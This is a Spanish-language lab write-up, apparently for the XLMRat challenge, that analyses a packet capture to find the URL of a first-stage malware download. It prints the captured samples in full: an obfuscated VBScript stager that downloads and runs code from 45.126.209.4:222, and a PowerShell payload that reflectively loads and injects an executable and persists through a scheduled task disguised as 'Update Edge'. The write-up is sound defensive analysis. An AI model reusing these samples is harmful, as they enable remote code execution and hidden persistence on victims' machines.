### Task #1

> “The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?”

Esto significa que: Un comando fue ejecutado en el host victima. Este realizó una descarga, probablemente vía HTTP (método GET), Desde una IP externa y con respuesta 200 OK. 

![[xmlrat-1.png]]


En primer lugar se observa el tráfico HTTP: 
- Hay tráfico HTTP externo? **Si, hay tráfico HTTP** Se confirma al ver el protocolo **HTTP** luego de filtrar el tráfico y observar que el recurso solicitado (`/xlm.txt`) se está pidiendo a una dirección que no pertenece a la red local del host.
- Quién inicia la conexión? **La dirección IP `19.1.9.101` inicia la conexión** (**la máquina comprometida**)
- Hay requests hacia IP públicas? **La petición se realiza hacia la dirección IP `45.126.209.4`** (**la máquina del atacante**)
En el modelo cliente-servidor de HTTP, el que envía el método `GET` es quien inicia la solicitud de datos.
- **El iniciador (Cliente):** `10.1.9.101`
- **El receptor (Servidor):** `45.126.209.4`
- La IP **`10.1.9.101`** es una dirección **privada** (Clase A).
- La IP **`45.126.209.4`** es una dirección **pública**.
Cualquier comunicación que salga de un rango privado (`10.x.x.x`, `192.168.x.x`, `172.16.x.x`) hacia una IP fuera de esos rangos se considera tráfico externo o hacia internet.

![[XMLrat-2.png]]

Al analizar la IP pública en [AbuseIPDB]([google.com](https://www.abuseipdb.com/check/45.126.209.4)) se observa qué el **hostname** se encuentra asociado al dominio `reliablesite.net` y fue reportado en multiples ocasiones, información detallada: 

![[XLMRat-3 1.png]]

A su vez, mediante `Export Objects --> HTTP ` se observa que solo fueron descargadas desde el **hostname** `45.126.209.4:222` únicamente los archivos `xlm.txt` y `mdm.jpg` El tamaño de la imagén (431kB) es altamente sospechoso. 

![[XLMRat-4.png]]

Proceso del ataque: 

| **Paquete** | **Origen (Iniciador)** | **Destino**    | **Acción**             | **Archivo**         |
| ----------- | ---------------------- | -------------- | ---------------------- | ------------------- |
| **4**       | `10.1.9.101`           | `45.126.209.4` | **GET** (Petición)     | `xlm.txt`           |
| **7**       | `45.126.209.4`         | `10.1.9.101`   | **200 OK** (Respuesta) | (Contenido enviado) |
| **12**      | `10.1.9.101`           | `45.126.209.4` | **GET** (Petición)     | `mdm.jpg`           |

Al realizar `Follow --> HTTP Stream` al tráfico HTTP es posible observar desde donde la primer etapa del malware fue instalada `http://45.126.209.4:222/mdm.jpg`. 

En primer lugar, realizamos seguimiento al flujo HTTP del tráfico del `xlm` 

~~~PowerShell
GET /xlm.txt HTTP/1.1
Accept: */*
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Host: 45.126.209.4:222  # <------------ HOST atacante.
Connection: Keep-Alive


HTTP/1.1 200 OK
Date: Tue, 09 Jan 2024 17:27:28 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
Last-Modified: Fri, 05 Jan 2024 10:28:14 GMT
ETag: "7b6-60e304e3f0e63"
Accept-Ranges: bytes
Content-Length: 1974
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain

Dim LZeWX(88), OodjR, i

' Define each part based on the provided order
LZeWX(0) = "[B"
LZeWX(1) = "YT"
LZeWX(2) = "e["
LZeWX(3) = "]]"
LZeWX(4) = ";$"
LZeWX(5) = "A1"
LZeWX(6) = "23"
LZeWX(7) = "='"
LZeWX(8) = "Ie"
LZeWX(9) = "X("
LZeWX(10) = "Ne"
LZeWX(11) = "W-"
LZeWX(12) = "OB"
LZeWX(13) = "Je"
LZeWX(14) = "CT"
LZeWX(15) = " N"
LZeWX(16) = "eT"
LZeWX(17) = ".W"
LZeWX(18) = "';"
LZeWX(19) = "$B"
LZeWX(20) = "45"
LZeWX(21) = "6="
LZeWX(22) = "'e"
LZeWX(23) = "BC"
LZeWX(24) = "LI"
LZeWX(25) = "eN"
LZeWX(26) = "T)"
LZeWX(27) = ".D"
LZeWX(28) = "OW"
LZeWX(29) = "NL"
LZeWX(30) = "O'"
LZeWX(31) = ";["
LZeWX(32) = "BY"
LZeWX(33) = "Te"
LZeWX(34) = "[]"
LZeWX(35) = "];"
LZeWX(36) = "$C"
LZeWX(37) = "78"
LZeWX(38) = "9="
LZeWX(39) = "'V"
LZeWX(40) = "AN"
LZeWX(41) = "('"
LZeWX(42) = "'h"
LZeWX(43) = "tt"
LZeWX(44) = "p:"
LZeWX(45) = "//"
LZeWX(46) = "45"
LZeWX(47) = ".1"
LZeWX(48) = "26"
LZeWX(49) = ".2"
LZeWX(50) = "09"
LZeWX(51) = ".4"
LZeWX(52) = ":2"
LZeWX(53) = "22/m"
LZeWX(54) = "dm"
LZeWX(55) = ".j"
LZeWX(56) = "pg"
LZeWX(57) = "''"
LZeWX(58) = ")'"
LZeWX(59) = ".R"
LZeWX(60) = "eP"
LZeWX(61) = "LA"
LZeWX(62) = "Ce"
LZeWX(63) = "('"
LZeWX(64) = "VA"
LZeWX(65) = "N'"
LZeWX(66) = ",'"
LZeWX(67) = "AD"
LZeWX(68) = "ST"
LZeWX(69) = "RI"
LZeWX(70) = "NG"
LZeWX(71) = "')"
LZeWX(72) = ";["
LZeWX(73) = "BY"
LZeWX(74) = "Te"
LZeWX(75) = "[]"
LZeWX(76) = "];"
LZeWX(77) = "Ie"
LZeWX(78) = "X("
LZeWX(79) = "$A"
LZeWX(80) = "12"
LZeWX(81) = "3+"
LZeWX(82) = "$B"
LZeWX(83) = "45"
LZeWX(84) = "6+"
LZeWX(85) = "$C"
LZeWX(86) = "78"
LZeWX(87) = "9)"

' Combine the parts into one string
OodjR = ""
For i = 0 To 88 - 1
    OodjR = OodjR & LZeWX(i)
Next

' Use the combinedParts in the shell execution
Set objShell = CreateObject("WScript.Shell")
objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
Set objShell = Nothing
~~~

Realizamos seguimiento al flujo HTTP del tráfico que contiene el `mdm.jpg`. Se encontró dentro del código la variable `$hexString_bbb` la cual empieza por `4D_5A` (que en ASCII es **MZ**, la firma de cualquier archivo ejecutable `.exe` de Windows)

~~~VBScript
GET /mdm.jpg HTTP/1.1
Host: 45.126.209.4:222
Connection: Keep-Alive
HTTP/1.1 200 OK
Date: Tue, 09 Jan 2024 17:27:29 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
Last-Modified: Fri, 05 Jan 2024 12:07:33 GMT
ETag: "69468-60e31b1792a41"
Accept-Ranges: bytes
Content-Length: 431208
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/jpeg

...$Content = @'

$hexString_bbb = "4D_5A_90_00_...(mucho hexadecimal) 00_00"

Sleep 5

[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5

$HM = 'L###############o################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)

$NK = $Fu.GetType('N#ew#PE#2.P#E'-replace '#', '')
$MZ = $NK.GetMethod('Execute')
$NA = 'C:\W#######indow############s\Mi####cr'-replace '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace '#', ''
$VA = @($AC, $NKbb)

$CM = 'In#################vo################ke'-replace '#', ''
$EY = $MZ.$CM($null, [object[]] $VA)

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)  

$Content = @'
@e%Conted%%Conted% off
set "ps=powershell.exe"
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Conted.ps1"
%ps% %Contedms% -Command "& '%cmd%'"
exit /b

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)

$Content = @'
on error resume next
Function CreateWshShellObj()
	Dim objName
	objName = "WScript.Shell"
	Set CreateWshShellObj = CreateObject(objName)
End Function

Function GetFilePath()
	Dim filePath
	filePath = "C:\Users\Public\Conted.bat"
	GetFilePath = filePath
End Function

Function GetVisibilitySetting()
	Dim visibility
	visibility = 0
	GetVisibilitySetting = visibility
End Function

Function RunFile(wshShellObj, filePath, visibility)
	wshShellObj.Run filePath, visibility
End Function

Set wshShellObj = CreateWshShellObj()
filePath = GetFilePath()
visibility = GetVisibilitySetting()
Call RunFile(wshShellObj, filePath, visibility)

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)

Sleep 2

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()

$taskDefinition = $scheduler.NewTask(0)
$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
$taskDefinition.Settings.Enabled = $true
$taskDefinition.Settings.DisallowStartIfOnBatteries = $false
$trigger = $taskDefinition.Triggers.Create(1) # 1 = TimeTrigger
$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
$trigger.Repetition.Interval = "PT2M"

# .......... ...... Action
$action = $taskDefinition.Actions.Create(0) # 0 = ExecAction
$action.Path = "C:\Users\Public\Conted.vbs"

$taskFolder = $scheduler.GetFolder("\")
$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
~~~

Se verifica el **SHA256** en [CyberChef]()
